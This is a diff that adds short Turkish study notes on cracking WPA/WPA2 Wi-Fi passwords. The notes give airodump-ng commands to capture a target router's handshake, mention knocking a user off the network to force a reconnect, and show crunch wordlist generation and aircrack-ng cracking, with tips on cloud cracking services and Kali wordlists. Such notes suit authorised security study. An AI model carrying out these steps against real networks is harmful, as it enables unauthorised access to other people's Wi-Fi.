@@ -1,0 +1,28 @@
+
+--------------------------
+
+	WPA
+
+* WPA ve WPA2 aynı şekilde kırılmaktadır. Her ne kadar farklı şifreleme algoritmaları kullansalar da.
+
+1. Handshake yakalamaya çalışırız :
+
+	* airodump-ng --bssid <ModemMacAdresi> --channel 8 --write airodumptest wlan0
+		- Karşımıza çıkan ekranın en üstünde Handshake ile alakalı bir mesaj görürüz.
+		- Eğer görmezsek o kişiyi ağdan düşürüp tekrar bağlanması için yaptığımız saldırıyı yaparız
+
+2. cruck tool'unu kullarak wordlist oluşturuyoruz
+
+	* crunch <MinKarakter> <MaxKarakter> <WordİçindeGeçecekHarfler> -o <KaydetmekIstediğimizDosyaAdı>
+		- word listimizi oluşturduk
+
+3. aircrack-ng handshake-file-01.cap -w ../tesweordlis
+	- Yakaladığımız handshake dosyasını kaydettiğimi .cap uzantılı dosya ile wordlist dosyamızı birlikte kullanıyoruz.
+
+NOT : Bu şekilde şifreyi kırma denemeleri çok uzun süreceğinden dolayı internetten bulut üzerinden bunun hizmetini veren
+siteler kullanılabilir.
+
+NOT : Kali içerisindeki klasörlerden birinde en çok kullanılan şifreleri barındıran bir wordlist mevcuttur
+	- /usr/share/wordlists
+
+--------------------------
